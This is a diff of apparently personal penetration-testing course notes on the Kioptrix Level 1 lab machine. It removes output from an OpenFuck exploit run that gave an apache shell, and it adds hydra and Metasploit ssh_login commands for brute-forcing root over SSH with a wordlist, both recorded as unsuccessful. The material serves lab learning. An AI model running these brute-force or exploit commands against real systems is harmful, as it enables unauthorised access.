@@ -346,19 +346,29 @@ output:
   OpenLuck
 install insrtuctios: https://github.com/heltonWernik/OpenLuck
 
-./OpenFuck 0x6b  10.0.2.4 -c 40
-outout :
-   shell screen:        'bash-2.05$'
-   hostname: kioptrix.level1
-   whoami:  apache    
 
                 ----------       Brute force attacks     -------------
   02:59:00 https://www.youtube.com/watch?v=sH4JCwjybGs
   
-  ls -la  /usr/share/metasploit-framework/data/wordlists
-  hydra -l root -P /usr/share/wordlists/metasploit
+  1.ls -la  /usr/share/metasploit-framework/data/wordlists
+  there is a long list of file that contains passward fo verios systems
+   we will chose unix_passwords.txt
 
-
+  hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://10.0.2.4:22 -t 4 -V
+  does not work
+  2  msfconsole
+     search ssh
+	 output:  11  auxiliary/scanner/ssh/ssh_login    normal     No     SSH Login Check Scanner
+	  use    auxiliary/scanner/ssh/ssh_login
+	  at the prompt write : options
+	  write:  set username root
+              set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
+			  set rhosts 10.0.2.4
+			  set threads 10
+			  set verbose true
+			  run
+	
+     it will sand passward for root login but there is no success.	
 
 
  Demo Report
